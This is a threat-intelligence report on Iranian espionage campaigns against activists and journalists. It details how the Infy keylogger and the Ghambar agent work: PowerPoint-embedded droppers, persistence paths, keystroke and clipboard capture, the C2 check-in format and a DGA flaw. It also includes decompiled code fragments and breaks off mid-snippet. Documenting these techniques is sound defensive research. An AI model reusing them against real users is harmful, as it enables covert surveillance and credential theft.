Summary
Over the past decade, the Islamic Republic of Iran has been targeted by continual intrusion campaigns
from foreign actors that sought access to the country's nuclear facilities, economic infrastructure, military
apparatus, and governmental institutions for the purpose of espionage and coercive diplomacy.
Concomitantly, since the propagandic defacements of international communications platforms and
political dissident sites conducted by an organization describing itself as the "Iranian Cyber Army"
beginning in late 2009, Iranian actors have been attributed in campaigns of intrusions and disruptions of
private companies, foreign government entities, domestic opposition, regional adversaries and
international critics. While Iran maintains strong technical universities2 and an extraordinarily active
defacement community,3 the country has not invested in its capacity for Internet­based espionage to the
same degree as its traditional geopolitical rivals, and is less able to seek capabilities abroad from

companies such as Hacking Team or Finfisher due to its pariah status. As a result, the computer network
operations attributed to Iranian actors provide insight into the behavior of a country under scrutiny due to
its conflictual relationships with regional adversaries, and may reflect the general trajectory of other
countries seeking to use the espionage on modern communications technologies to pursue their own
geopolitical interests.
Civil society and political opponents are a primary target of Iranian intrusion campaigns, which gives rise
to the motivation and basis for our research into the ecosystems and threats originating from the country.
This document serves an initial technical overview in complement to a forthcoming publication from the
Carnegie Endowment for International Peace on Iran­based computer network operations, and is intended
to provide the following:
●

first accounting of a new threat actor targeting interests aligned with the Iranian state;
additional research on the activities of the Infy group, which supports and extends accounts of the
group's activities recently disclosed elsewhere;
documentation of new developments in the malware and activities believed to be connected to
known threat actors Rocket Kitten and Operation Cleaver; and,
descriptions of tactics by known actors in response to political events inside of Iran and changes
the use of personal communications tools by the public, namely the mass adoption of Telegram.

Our research incurs classic issues applicable to all reports on intrusion campaigns, primarily questions of
attribution and intent. The end objective of particular CNO activities is not always discernable based on
the tactics used or the data accessed, as the end implications of the disclosure of particular information is
often distant and concealed from even the target. Where such intent is made evident, the reasons for
Iranian intrusion campaigns range from retaliatory campaigns against adversaries, as a result of
identifiable grievances, to surveillance of domestic opposition in support of the Islamic Republic
establishment. Iranian intrusion sets appear to be interested in a broad field of challenges to the political
and religious hegemony of the Islamic Republic. Previous reports on Iranian campaigns have referred to
the targeting of Iranian dissidents, however, in practice those targeted range from reformists operating
within the establishment from inside of Iran to violent extremist organizations outside. Therefore, Iranian
CNO activities should be considered as a tool in the context broader state activities and policies, including
offline events.
For the purpose of organization, this document is divided based on the actor group that we believe to be
responsible for the tools, incidents, and activities under discussion. We also attempt to blend the context
and history of incidents with the technical specificities in each section, broken out into different
subsections. In order to avoid further expansion of this document, we momentarily defer to previous
reports for context about groups, with the intention of extending this background narrative later. In
practice, the distinction relied upon is artificial, as the boundaries between groups at times appears less
clear, and tactics have evolved rapidly in response to external pressure. For example, in past reports that
have identified Iranian malware such as Madi, Stealer, and Sayyad, these families of agents appear to fall
into disuse within a short period of their discovery and public attribution to Iranian entities. Such
discontinuity, and the opacity even within activities published on, has further reinforced the difficulty in

constructing a cogent narrative of specific threat groups. This aspect of the ecosystem is not in scope here,
and we focus instead on technical documentation, and will revisit the context in our forthcoming research.
Finally, this document is intended to be the first release in a set of continuing disclosures, and should be
considered a living resource; subject to revision, reconsideration and provided with the promise of
expansion.

Introduction
Over the course of three years of observation of campaigns targeting civil society and human rights
organizations, from records of well over two hundred spearphishing and other intrusion attempts against
individuals inside of Iran and in the diaspora, a narrative of persistent intrusion efforts emerges. From
Madi onward, Iranian threat actors maintain a consistent set of interests and activities that blur the lines
between domestic surveillance and foreign commercial espionage. This pattern continues across
subsequent groups. ​
Infy​
engaged in malware spearphishing against the same targets as Flying Kitten from
the outset of its campaign; Operation Cleaver has registered several resources related to development
agencies that have been the subject of intrusion attempts by others since February 2014. This
documentation provides new insight into intrusion efforts conducted by at least four discrete Iranian threat
actors, Rocket Kitten, Infy, Sima, and Operation Cleaver, including groups and tools that have not been
previously disclosed.
Attribution of different Iranian intrusion efforts has been made possible through the reuse of common
templates and infrastructure over long periods of time, coupled with failures in operational security that
exposed information on the actors behind the campaigns. These approaches are imperfect, as the
participants often attempt to break patterns after publicity has called attention to their activities and
provided critical external feedback on their strategies. No collected documentation demonstrates the
process of selecting targets or coordinating campaigns, however, many of those targeted would be later
singled out by other actors, and their targeting aligns with Iran’s political environment. The intrusion sets
documented have clear indications of being solely Iranians inside of Iran, with little indication of
participation from Iranians in the diaspora or support from non­Iranians. At the most basic level, the
groups of actors follow similar patterns of life approximating that of an Iranian workday (Saturday
through Wednesday) and are fully dormant on Iranian holidays, particularly the long vacation period of
Nowruz.
Based on our longitudinal account of infrastructure employed in intrusion attempts against civil society,
we find that the activities of Iranian actors date back further than previously documented and cover a
richer set of targets. Iranian threat actors have responded to improved information security practices
amongst its target populations and increased pressure resulting from publication of their activities. The
Sima and Operation Cleaver groups represent the most sophisticated spearphishing campaigns observed
from Iran thus far, using open mail relays to send professionally­tailored messages based on monitoring

of target interests and emotional manipulation, such as stark threats of immigration issues as the
Department of Homeland Security. While such campaigns may not represent Iran’s graduation to a first or
second tier power, these incidents impact livelihoods, and their documentation provides tactics of public
accountability. The study of these properties and the similarities between actors lends an insight into the
capabilities and interests of Iranian intrusion sets, and their foreshadows future activities.

Campaigns and Actors4
Infy
Introduction
Since early 2013​
,​
we have observed activity from a unique threat actor group, which we began to
investigate based on increased activities against human right activists in the beginning of 2015.5 In line
with other research on the campaign, released prior to publication of this document, we have adopted the
name “Infy”, which is based on labels used in the infrastructure and its two families of malware agents.
Thanks to information we have been able to collect during the course of our research, such as
characteristics of the group’s malware and development cycle, our research strongly supports the claim
that the Infy group is of Iranian origin and potentially connected to the Iranian state. Amongst a backdrop
of other incidents, Infy became one of the most frequently observed agents for attempted malware attacks
against Iranian civil society beginning in late 2014, growing in use up to the February 2016 parliamentary
election in Iran. After the conclusion of the parliamentary election, the rate of attempted intrusions and
new compromises through the Infy agent slowed, but did not end. The trends witnessed in reports from
recipients are reinforced through telemetry provided by design failures in more recent versions of the Infy
malware.

NB​
​
: Historically, naming schemas on Iranian actors have been challenging, even when researchers are acquainted
with the cultural, linguistic and political context of the country. For example, while Madi was linked with the Shi’a
belief in the Twelfth Imam, Mahdi is also a common name, which arises elsewhere in several samples alongside
other Persian names or words (“Motahare.txt”). Similarly, while “Gholee” was linked to a minor musician in one
report, the reference could have as easily been a code comment in Persian relevant to its functionalities (from
transliterated Persian, “peak”). Where we find names embedded in samples from project resources, they are often
less than inspiring, such as “ExtremeDownloader” or “Stealer.” The approach of using unique strings still seems
more preferable than generic references to Iran, so where possible, our naming convention relies on unique
identifiers that originate from malware agents and infrastructure that are sufficiently distinctive, while attempting to
avoid sensationalism or stereotypes.

After the drafting of this paper was completed, California­based security vendor Palo Alto Networks published
two blog posts that includes information on this same campaign. Similarly, the Helios Team at 360 SkyEye Labs has
documented some of the activities of Infy under Operation Mermaid. While these reports often have commonalities
and overlaps, they all offer differing and complementary perspectives into the campaign.

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

Palo Alto Networks has noted and described the differences of two malware agents developed in parallel,
with commonalities in behavior but differing functionalities; families described as Infy and Infy M. Our
primary observation was of the Infy (non­M) malware, which primarily functions as a keylogger for the
collection of account credentials. Until the publication of the Palo Alto report, the developers of the Infy
appeared to be actively updating and maintaining the codebase, and new releases were distributed to
existing, as well as new, targets quite regularly. At the time of writing, the latest Infy keylogger was
version 00031, which appears to have been interrupted by public disclosure before it reached wide
deployment, with our first collected samples appearing in May 2013. Other samples were found bearing a
compilation time as early as June 2012 and version 00002. Similar to the increase prior parliamentary
election, these first samples appeared coinciding with Iran’s Presidential election – then a critical moment
due to being the first Presidential election since the highly­contested Green Movement.
Our analysis indicates that the Infy malware agents have been employed for compromising targets
pertinent to the internal security interests of the Iranian government since at least July 2010. Infy is
evidently an intrusion operation that has been running for several years, even continuing on in some form
since the publication of the activities, with new agents found from late June 2016.

History and Tactics
Prior to the June 2013 Presidential election, staff members of BBC Persian and other Persian­language
satellite television networks received a series of files purporting to be statements from political opposition
groups inside of the country. One message 6 claimed to be from Mohammad Taghi Karroubi, the son of
reformist politician Mehdi Karroubi who ran for presidency in the 2009 elections and has been under
house arrest since February 2011 (25 Bahman). The document discusses the disqualification of former
President Hashemi Rafsanjani from the elections, the role of the Guardian Council in the vetting of
candidates, and whether reformists should vote. The original source of this document is unclear. The text
also does not appear to have been publicly­available, and may have been falsely attributed to Mohammad
Taghi.
As the election neared, successive documents with the filenames of “Statement”7 and “Alliance”8 in
Persian were sent from the same Gmail address to a widening set of media figures outside of Iran,9 such
as Nima Akbarpour10 and Nikahang Kowsar11 , and social network users supporting reformist figures.12

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

While the defacements and mass phishing events, conducted by other groups in parallel to the malware
emails, waned after the elections, the intrusion attempts from the Infy malware group did not. The culprits
behind the campaign expanded tactics, sending malware embedded in PowerPoint presentations topical to
events in Iran, such as “Iran’s Nuclear Power!”13, and impersonating others to leverage social trust. Over
the months following the elections, the accounts of Iranians that had been compromised by the actors
were then used for spreading the malware. The personal email of an employee of VOA’s Persian News
Network was used to send the Infy malware to other journalists, attached as files named “Visual”
(didani.pps) and “Invitation Card.”14 Shortly after, in August 2013, a typographic email address claiming
to be a reformist activist and journalist was used to approach a Persian­language broadcaster and a Green
Movement supporter, with malware samples embedded in content related to poverty. Similarly, a
imposture account posing as an Iranian professor of political science and media commentator was used to
approach a BBC Persian presenter and others in the following year.
Our observation of Infy’s campaigns, primarily through the lens of spearphishing attacks against Iranian
civil society and media organizations, indicates a wandering focus on particular demographics on a
strategic basis over time. When activities targeting of civil society subsided, the actors instead appeared to
have focused on external targets, such a series of attempts to spearphish the Danish Ministry of Foreign
Affairs.15 The Infy malware was seen targeting Iranians again in June 2015, when it was shared with
researchers after being sent to a broadcast journalist at BBC Persian with a generic introduction and a
PowerPoint presentation attached titled “Nostalogy”16 (sic).
Based on samples and observations of spearphishing attempts, it appears that during this time there was
an evolution in Infy’s infrastructure and tactics, connected with renewed attempts at surveillance of
diaspora organizations. Based on information collected in the course of this research, the targets and
victims of Infy’s campaigns have continued to be strongly aligned with Iran’s “soft war” agenda, internal
security policies, and regional adversaries of the hardline establishment of the Islamic Republic of Iran.
The trends align with campaigns concurrently conducted by other known Iranian intrusion sets, even to
the extent of overlapping intrusion attempts and shared successful compromises of targets.

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

Until late December 2015, in nearly every Infy message documented since our tracking began in May
2013, no attempt included strong tailoring of the approach, often not even including an email body,
instead relying on cryptic filenames and email subjects to attract interest. That December marked a
meaningful departure from this pattern, as the culprits began to add more descriptive information to their
attempts, addressing topical issues and catering to the interests of the target. As in the past, these
messages have been sent accounts believed to be fake and accounts compromised by Infy, including
Kurdish activists that had previously been compromised by the Flying Kitten actor group.17
The targets and timing of this shift aligns with increased attention to the political environment in the lead
up to the February 2016 Parliamentary Election. One narrowly­targeted spearphishing from Infy was sent
from the compromised account of a political activist promoting participation inside of Iran, claiming to be
a set of images of a British­Iranian dual national that has been held in Evin Prison for five years on
espionage charges.18 These message have also encouraged their targets to share the documents to other
human rights organizations and media outlets, in the hopes of further increasing their potential reach.
These improved pretexting tactics are well connected to the press cycle. Within days of the mass
disqualification of reformist parliamentary candidates by the Guardian Council, one message claimed to
cover opposition protests; another, purported to contain Hassan Khomeini’s reaction to the rejection of his
religious credentials in his attempted candidacy for the Assembly of Experts.

Watering Hole
Contact information and infrastructure used in the operations of the Infy group implicate a broader set of
domains than those directly used in command and control operations with the agent. These domains
commonly reflect a naming schema related to blogging and visitor analytics (e.g. “bestwebstat.com”).
Based on live and archived examples of such tactics, a subset of the Infy group’s domains appear to have
been used in order to stage watering hole attacks against ethnic minority populations and militant
organizations over the course of at least five years.
Our earliest observed watering hole incident, occurring in July 2010, involved intrusions into the “Taftaan
News Agency” and “Jonbesh­e Moqavemat­e Mardomi­e Iran” blogs, sites associated with the
Balochistan­based Jundallah – a militant movement internationally recognized as a terrorist organization.

Shortly after the suspected time of intrusion, at least one target had warned its visitors that an old email

address connected to the site had been compromised by actors it claimed was associated with Iranian
intelligence agencies and then used to target others in the community. The following day, the
administrators noted technical issues as a result of these attacks in a post announcing the closure of the
site.20 The actors behind the incidents gained access to pertinent sites, and embedded a hidden iframe in
the target page claiming to be a “Stat Counter” in order to disguise the intention of the malicious code.
The malicious iframe appears to have used well­known ActiveX vulnerabilities for IE6 and IE7 (which
would have still been used in 2010) in order to push an early version of one of the Infy agents to visitors.
In addition to common infrastructure and recognizable binary names related to other Infy attacks, the
delivering mechanism included Persian­language comments on the functioning of the code within its
otherwise packed Javascript.21
The use of watering hole tactics continued until at least the middle of May 2015, 22 when a Kurdish news
site (Kurdistannet) was similarly compromised for the purpose of delivering the Infy M agent. The
intrusion into the Kurdish site aligns with the organization’s documented history of targeting Kurdish
activists, particularly those based in Iran or of Iranian nationality.

Victimology
While not indicative of the full extent of other intrusion operations the Infy group might be running, as of
March 31, 2016, we observed a total of ​
236 unique victims​
distributed across ​
27 countries​
from solely
versions 25 through 30 of the Infy (non­M) agent. For how this telemetry was collected, see ​
A Not So
Clever Failover Strategy​
. Interestingly, the number and the nature of victims have reflected political
events and the evolving geopolitical interests of Iran. For example, we observed new compromises
located in Saudi Arabia in the fallout between the countries after the execution of a Shiite cleric and the
Mina Hajj stampede. 23

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

Infy (v. 25 ­ 31) Infections, December 2015 ­ May 2016
The primary targets of these campaigns have consistently been Iranians inside of Iran, with ​
48%​
of
identified intrusions connected with IP addresses located in Iran, in addition to a strong interest in Iranians
in the diaspora, as indicated by the messages in bait files and hostnames we were able to observe. The
attackers maintained a secondary interest in espionage against regional adversaries and neighboring states.
This characteristic matches previously documented CNO campaigns. As with Flying Kitten and Rocket
Kitten, the resources and personnel leveraged in Infy campaigns against domestic opponents overlap with
espionage against perceived external threats. Moreover, the locations and discernable nature of the
compromised hosts align with known policy objectives of the Islamic Republic. It is worth noting that in
order to establish a more accurate count, we had to deduplicate records from victims appearing to connect
from multiple countries. Unsurprisingly, many victims located in Iran had been using VPN services,
leading to connections from a changing set of countries that their circumvention tool had tunneled traffic
through. Efforts were made to exclude circumvention tool IPs, and determine the clients that were
originally based in Iran despite their tunneled traffic.

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

Infy (v. 25 ­ 31) Infections, December 2015 ­ May 2016
While the near majority of the victims are located in Iran, the remaining hosts are widely distributed
around the world, with a higher concentration in the United States, Sweden, Germany and Iraq – locations
with large Iranian diasporas or regional interests. Several compromised systems maintain a clear
relationship to regional adversaries and foreign entities that Iran maintains an espionage interest in. At
least two hosts based in Israel have been compromised to date, although in one case these systems appear
to have been associated with a person of Arabic or Persian descent. The Infy group also appears to engage
in espionage activities against foreign governments and businesses. The actors successfully compromised
a host of an Saudi government institutions on January 17, 2016, and maintained access for at least two
weeks. Similarly, a computer in Riyadh located on a network registered to the National Engineering
Services and Marketing Company was compromised. Multiple systems in Pakistan and Afghanistan have
been breached, including several on Afghan government networks.

Infy Tools & Techniques
In order to initially compromise the designated targets, the attackers typically distributed
specifically­crafted malicious documents containing Infy through spearphishing attacks. The attackers in
most cases took existing PowerPoint presentations, or crafted new ones, and inserted some PE32 dropper
as a Packager Shell Object inside the title slide. Interestingly, several of these documents expose the
original file path in the attacker’s computer, showing the account name of the user who crafted the
attacks:

10

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

With the executable embedded in the presentation, by assigning an “On Previous” custom “Object
Action” animation, it is automatically extracted to %Temp% and executed in the moment the presentation
is launched.

Normally, the victim would have to click “Ok” to a security warning dialog, before the dropper can
proceed with its execution. Ironically, the patches introduced by Microsoft to fix the Sandworm
vulnerabilities, have changed the security dialogs to messages that are a lot less alarming. As showed in
the previous picture, the attackers also tend to create multiple Packager Shell Objects, eventually

11

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

triggered by different events, probably to increase the chance that the victims would concede into running
the payload.
Before patch MS14­060

After patch MS14­060

In more recent iterations of these malicious documents, the attackers started protecting them with a
password, so that they can only be open in read­only mode, making their inspection slightly harder.
The main malware artifact that we observed employed by this group is a very simple keylogger developed
in Delphi. It is compiled in the form of a Windows DLL file that is installed by an initial dropper inside
the ​
“C:\ProgramData\Adobe\”​
folder (or “​
C:\Documents and Settings\All Users\Application
Data\Adobe\​
” folder in older versions of Windows), named “​
airplugin.vX.X.X.dll​
”, and registered in the
Windows registry to be executed at startup through ​
rundll32.exe​
and with the arguments “​
startX /exc​
”
(where X is a digit like 1, 2 or 3, depending on the version of the malware). Before installing it
permanently, the file is also temporarily stored with the filename pattern “​
mpro.X.X.X.dll”​
.
One of the latest versions employed at the time of writing, marked as 00030, saw a change in the naming
scheme of the files, as well as of the functions exported by the DLL. For example, the latest sample24 we
obtained and utilized on mid­April 2016, is installed in the folder “​
C:\ProgramData\CyberLink\​
” with
name “​
CLMediaLibraryX.X.X.dll​
” and it is executed with the arguments “​
mainf /rcv​
”.
The Infy malware is very limited in functionality and seems to have been primarily designed to record
keystrokes, that are then stored in a ROT­obfuscated .dat file and later uploaded to the primary command
and control server. While most Windows keyloggers either intercept keystrokes at kernel level or by using
either the ​
GetAsyncKeyState​
or ​
SetWindowsHookEx​
win32 APIs, Infy instead uses ​
RegisterHotKey​
to
install global hotkeys on all available keys. While this is a known technique, it is relatively uncommon,
due to the simplicity of the alternatives previously mentioned.

Probably in order to prioritize later inspection by the attackers, the log file highlights keystrokes that have
been recorded from known browser windows (Internet Explorer, Firefox, Chrome, and Opera). It is
plausible that the main intent of the attackers is to steal credentials for email and social media accounts, as
was seen amongst other Iranian actors, such as Flying Kitten.

Additionally, the Infy malware initiates a separate Timer and it periodically invokes the
GetClipboardData​
API to copy and store the content in the same .dat log file. For example:

This additional interception might have been employed to circumvent the use of password management
software, a common component of digital security trainings, that allow the users to avoid remembering
and manually typing the passwords for logging into all the different online services they commonly
access.

Network Infrastructure and Communications
The Infy malware is designed to regularly beacon back to an HTTP server controlled by the operators. At
first, it performs an initial check in with the command and control to register and eventually fetch updates.
The URLs and the arguments used by the malware have occasionally changed, but at the time of the
broader infrastructure takedown this function looked like the following:
GET /glp/uglp.php?cn=[COMPUTER NAME]&dn=1&ver=[VERSION
NUMBER]&lfolder=f1&cpuid=[CPUID]&machineguid=[MACHINE GUID]&tt=[TIMESTAMP]
HTTP/1.1

Infy and Infy M variants, the domains used for communications changed across different versions,
potentially as a result of their blacklisting and detection by antivirus products (reasons for this hypothesis
are noted in ​
Participants​
section). Older infrastructure resources did continue to be maintained in order
service agents from past versions, and Palo Alto notes in its sinkhole data that a non­trivial number of
clients were infected by extremely old agents. For example, the DNS records were all been reconfigured
simultaneously in April 2016 when Infy attempted to change providers.

A Not So Clever Failover Strategy
The authors of the Infy keylogger included a failover command and control communication system. By
using a Domain­Generation­Algorithm (DGA), the malware is instructed to contact a different domain
every day in the form of box40XX.net, where XX is a digit that appears to increment every day and resets
on a monthly basis. While normally DGAs are triggered only in the case that the primary command and
control server isn't responding (because it has been seized, or otherwise disabled), in this case the
malware attempts to systematically contact the daily domain every time a set timer hits, regardless of the
15

Guarnieri & Anderson

availability of the main C&C. We noticed on first discovery of this DGA mechanism that only in one case
had a failover domain has been registered by the operators (box4054.net), while all the remaining ones
had been left unregistered.
We also noticed that the primary command and control server is able to instruct the agents to download
and execute any binary file. In order to do so, the command and control server would simply reply to the
first check­in request with an HTTP 302 redirect to a URL pointing to a Windows executable. This is
normally used by the primary C&C to distribute updates of the malware, when new versions have been
developed and tested. We attempted to reproduce this procedure and discovered that we were able to
trigger the malware to pull and execute any binary file we wanted also when contacting one of the DGA
domains. Clearly, if noticed by other malicious actors, this flaw in the design of Infy's command and
control system could be abused to deploy additional malware, since no verification or authentication of
the downloaded binary is performed.
In order to collect more accurate information on the nature of the targets of the Infy campaign, notify
victims and prevent abuse of this security failure, beginning at the end of December 2015 we registered
all the domains that were left available and recorded the requests coming in from this failover mechanism.
When the Infy group began notice that its domains and hosts were being taken down, it sought to register
additional DGA domains and were able to control two more names (box4070.net and box4071.net). The
remainder are under our control and being sinkholed to prevent abuse.

Participants to Infy
Across at least six years of operation, at least three within the scope of the currently documented
campaign, the entities behind Infy have recurrently used the same identifiers in their registrations and
communications, which indicate an Iranian origin and could be personally­identifiable information.
While multiple sets of domains have been used in the command and control infrastructure for both Infy
agents, these domains were typical originally registered under email addresses associated to the name
‘Amin Jalali,’ with the addresses aminjalali_58@yahoo.com, aj58mail­box@yahoo.com,26 and
am54ja@yahoo.com.27 The contact information on these domains have been updated in recent months
with false identities attributed to Poland and India to masque the original registrant, however, the
ownership and contact email remains the same.

The aliases associated with Amin Jalali appear elsewhere outside of registrations. A user ‘aj58’ posted28
in late July 2015 on the user forums of Sophos claiming that the detection of the domains
‘bestupdateserver.com’ and ‘updateserver1.com’ as malicious was mistaken, and that there was no
malware hosted on these sites. Both domains were frequently used as command and control for their
malware campaigns in the first half of 2015, and the categorization of the domains as malicious was
correct. While McAfee appears to have changed the categorization in its TrustedSource database, the user
apparently was unable to clear the domains from a sufficient number of antivirus products, and registered
the second group of domains a few weeks later.

“In memory of him, rest in peace. Lucky him to become a martyr. ”
Finally, the sinkhole logs on the DGA failover mechanism provides some indication as to the
development cycle and actors behind the Infy malware. Prior to the distribution of new versions of the
agent, the Infy developers appear to consistently conduct tests from local hosts, which indicates that the
control and maintenance of the software occurs in the Khorasan Razavi province of Iran, potentially in the
city of Mashhad. These testing periods appear as episodes where a few hosts from a previously unseen
version of the client register on the backup infrastructure, and are the only live copies of that version for a
length of time. Typically these hosts have the same generic system information, likely virtual machines
dedicated to testing of the agent, and have mistakes in their operation. Those clients then stop responding
around the time that other systems from a heterogeneous set of locations and machine names begin to
register, indicating that the version has been pushed out to the public.
Our dataset covers three testing and deployment cycles of versions of the Infy agent.

Other names and references to the infrastructure maintained by Infy, or used in communications with
targets, suggest pseudonyms or identities of the culprits, as well as their origin or political disposition. In
the series of spearphishing attempts against Persian­language media figures conducted prior to the June
2013 election, the phrase Baran Omid was used consistently, either the name of a woman or the phrase
“Rain of Hope.” The word, Baran, would also arise in the executable extracted by earlier versions of the
malware “C__Users_baran_AppData_Local_Temp_done[1].exe.” In metadata documents that served as
malware vectors, we also find document author names of ‘baran.’30
In later versions of Infy documents, the authorship information is set to ‘ya zahra’ and ‘ya husein’ ­­
expressions that maintain Shi’a religious connotations referring to the wife of Ali and daughter of
Mohammad, and Ali’s martyred son, respectively.

Response to Publication
On May 2, 2016, Palo Alto Networks published the report “Prince of Persia,” which provided the first
public and widely­reported indication of Infy’s activities in Iran, while other publications either refrained
from making the association or were not openly available. By May 12,31 Palo Alto began to sinkhole the
primary command and control infrastructure, which combined with the prior registration of the DGA
resources, severely inhibited the continued operation of the Infy campaign. However, within this struggle
to maintain access, additional incidents of note occurred.
Firstly, actions taken by telecommunications regulators in Iran indicate either an intervention to end
operation of the Infy network or an attempt to interfere with further research. As of June 2016, a subset of
the domains identified in the operations of the Infy campaigns were specifically inaccessible inside of
Iran, aside from their being sinkholed to Shadowserver or directed to localhost.32 This unavailability is the

result of the content filtering mechanism imposed by the Iranian government blocking access to the
sinkhole through DNS tampering and HTTP filtering. The restrictions on Infy are explicitly targeted
against requests for command and control domain names identified in the Palo Alto report. This filtering
is conducted at the primary international gateway maintained by the Telecommunication Company of Iran
(AS12880), and as a result prevents further communications from the clients in Iran.

This is a unique phenomenon. Other domains from Palo Alto reports unrelated to Iran do not appear to
have been blocked, nor have domains connected to other Iranian intrusion campaigns such as Flying
Kitten or Cleaver. It appears that this unique action occurred after Palo Alto’s report, for reasons that are
not immediately clear. The filtering policy indicates that Iranian authorities had specifically intervened to
block access to the command and control domains of a state­aligned intrusion campaign at a country
level.
Concurrently, the sinkhole of campaign resources set off a struggle to regain control of the clients and
shift command infrastructure to alternative providers with new hostnames. Palo Alto began to disrupt
access to Infy’s primary domain names on a Thursday, the Iranian weekend. It was not until the start of
the Iranian work week, the morning of Saturday, May 14, that the Infy actors appeared to notice the loss
of their network and then the registration of the DGA. In their reaction and investigation, the developers
again exposed their original IP addresses, as they attempted to investigate the nature of the DGA domains
that had been registered (again from the Razavi Khorasan province). Only at the moment that the backup
domains were needed most did the actors notice their unavailability, nearly six months after we silently
began our sinkholing operation.

Despite the sinkhole actions and registrations of backup domains by researchers, the Infy actor group did
remain in control of a limited number of DGA names and other command and control resources. Based on
these names, and the limited window they afforded the actors, the Infy group was able to push down ​
Infy
M​
to ​
Infy​
clients in order to reassert control over a subset of the infected clients. These updates moved the
clients to an alternative set of names registered to the group, but did not remove the previous infections,
potentially leading to phenomena of clients infected with both versions of the client that was noted by
Palo Alto.
Palo Alto notes that in early June, the Infy actors had used command and control domain names and
addresses associated with an older version of Infy (versions 15 through 24) in order to push down a new
Infy M v. 8.0 client; an incident that represented their first observed transition from Infy to Infy M. Again
by June 12, the domain involved in this command and control function appears to have been sinkholed.
This was probably not the first time such an action occurred, and certainly not the last. In late June, the
Infy actors used their remaining DGA domains to push an additional version of Infy M (still 8.0) with
another domain name as the primary command and control (nstrad.dynu.com), which we were able to
sinkhole. However, by this point the attrition of repetitive migration appeared to have set in. Only one
client, based in Iran, continued to communicate with the infrastructure.

Infy (Unknown Variant) Post­Sinkhole Infections, June ­ July 2016
While researchers have been successful in redirecting and registering Infy hostname resources, at least a
subset of the clients appear to beacon to a remaining address despite the original name (uvps1.cotbm.com)
21

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

being sinkholed. It is unclear whether this is erroneous behavior or an undocumented mechanism of
beaconing, however, a limited window into the activities between late June and mid­July 2016 implicates
250 IP address in 19 countries. A significant portion of these addresses appear to be dynamic IPs or
VPNs, particularly those in Iran, suggesting the real number of infections is lower. These addresses are
largely a disjoint set from those that responded to the DGA of the Infy agents, however, the regions and
networks associated with the infections align with the client’s broader trends. The client base could
originate from the Infy M network.
Not matter the source or the cause of these continued client operations, the network remains active and
the demonstrable success of the threat group in compromising critical targets gives pause to the prospects
that the Infy campaign will end anytime soon.

Ghambar Malware
In December 2014, Cylance described a set of actors and tools, labelled “Operation Cleaver,” which
differed from those campaigns associated with Flying Kitten and Rocket Kitten. Cleaver was described as
a persistent campaign conducted over several years, targeting economic infrastructure, defense
corporations and governments in the Middle East and elsewhere. According to the tools and techniques
used in the campaigns, often centered on the development of a fictitious persona as a lure for employees
of targeted companies, the Cleaver threat group was considerably more ambitious than other groups.
While previous publication focused on espionage activities, the same personas and tools disclosed in
reports on the groups arose in other incidents occurring at the same time that were targeted against
religious minorities and foreign policy institutions focused on Iran. In our monitoring of activities similar
to those of Cleaver over the course of two years, until at least June 2016, over sixty identified domain
names targeted a more diverse set of institutions and nationalities, including: an Israeli advocacy
organization, American foreign policy institutions, Saudi economic and governmental entities,
international Iranian human rights organizations, the American and European defence industry base,
activists mobilizing on Facebook from inside of Iran, and civil aviation companies. Based on
commonalities between toolkits and targeting, we believe that it is the same group, although we also
believe the structure of the organization has shifted over recent months.
Included in these activities, we find indication of the development of a successor to malware agents
developed by the Cleaver actors. Currently, we identify this malware family as “Ghambar,” due to the
word being used in some function names and variables inside the same malware’s code; also subsequent
samples expose potentially personally identifiable information and alternative names. While Ghambar
does not seem to share any significant codebase with past tools, we believe that Ghambar might be the
successor of TinyZBot, which is one of the artifacts described by Cylance in the Operation Cleaver report.
Similar to TinyZBot, Ghambar is also developed in C# and it employs the same SOAP­based command
and control protocol. While it is provided with fewer features, Ghambar appears better designed and with

22

Iran and the Soft War for Internet Dominance

Guarnieri & Anderson

a cleaner code style. The samples we obtained33 dates to November­December 2015 and late April 2016,
representing distinct points in the development cycle of the agent.
private static void Main()
{
try
{
Utils.DbgPrint(".: In the name of God :.");
...
Within the decompiled code we find references to Islam, with the first instruction on installation of the
development version of Ghambar being the printing of the debug string of “In the name of God.” This
feature is the shorten version of the phrase "In the name of God, the Most Gracious, the Most Merciful"
(​
Bismillah ir­Rahman ir­Rahim)​
. The connotation of the phrase and its placement is notable, ​
Bismallah ​
is
the introduction of most chapters of the Quran, and is commonly referenced within the political discourse
of Muslim societies. Its inclusion in less public aspects of Cleaver’s operation may provide insight into
the developers of Ghambar and their reasons for engaging in such campaigns.34

Ghambar’s use in the wild was directly observed in April 2016 when a number of human rights activists
in the diaspora received invitations to a “Middle East Human rights Webinar” hosted by a small Spanish
university. The Cleaver actors breached the main site of the university, believed to be achieved through
the exploitation of a software vulnerability (a Nessus installation was found on a related
attacker­maintained server). Using the valid Sender Policy Framework address, the actors were then able
to send legitimate­appearing messages posing as the university that appeared to be invitations to an Adobe

Connect webinar. The referenced conference information was then hosted on the university site, leading
to valid links as well. Once on the page, and only if the user appeared to be on Windows, the page would
trigger a warning about an Adobe Flash update. As common elsewhere, the downloaded installer would
be a legitimate version of Flash bundled with Ghambar.

Structure and Operations
Ghambar is written in C# and appears distributed obfuscated with SmartAssembly. Using de4dot35 we can
easily deobfuscate the code and with ILSpy36 decompile the binary to its original source code. Within the
decompiled source code we quickly observe that the malware is provided with a debugging option in the
case the file “​
D:\Debug.Me​
” is present:
public static void DbgPrint(string log)
{
if (File.Exists("D:\\Debug.Me"))
{
Debug.Write(log);
}
}

By creating an empty file at that particular path, we can enable the logging which is helpful and
interesting when monitoring an initial execution:

What the main function does is install the malware in the proper folder
(“​
%AppData%\Pavilion\MSPavilion.exe​
”) and registers it in the ​

Ghambar Configuration​
.”
If the configuration provides paths to either a JPG or a PDF file, the Ghambar will open them as decoy.
The malware will then collect some basic information on the compromised system, instantiate a
connection to the command and control, and register to it. Subsequently, it initializes a keylogger with the
traditional ​
SetWindowsHookEx ​
technique, as well as a procedure to communicate and receive commands
from the C&C:
private static void IterativeRoutinsProc(ServiceManifest communicationChannel)
{
try
{
while (true)
{

Utils.DbgPrint("CommandControlProc");
CommandControlController.CommandControlProc(communicationChannel,
Program.ConfigInfo.TargetId);
Program.FileUploader.UploadAllOfflineFiles(communicationChannel,
